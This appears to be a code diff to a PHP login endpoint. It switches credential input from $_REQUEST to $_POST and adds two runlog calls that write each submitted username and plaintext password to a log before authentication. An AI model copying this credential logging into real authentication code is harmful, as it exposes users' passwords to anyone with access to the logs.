@@ -4,13 +4,14 @@ if ($_GET["op"]=="add"){
 
 	include_once S_ROOT.'./uc_client/client.php';
 
-	$username = empty($_REQUEST['username']) ? '' : trim($_REQUEST['username']);
-	$password = empty($_REQUEST['password']) ? '' : trim($_REQUEST['password']);
+	$username = empty($_POST['username']) ? '' : trim($_POST['username']);
+	$password = empty($_POST['password']) ? '' : trim($_POST['password']);
 
 	if(empty($username) || empty($password)) {
 		capi_showmessage_by_data('users_were_not_empty_please_re_login', 1);
 	}
-
+	runlog("wx", $username);
+	runlog("wx", $password);
 	// 登陆验证
 	if(!$passport = getpassport($username, $password)) {
 		
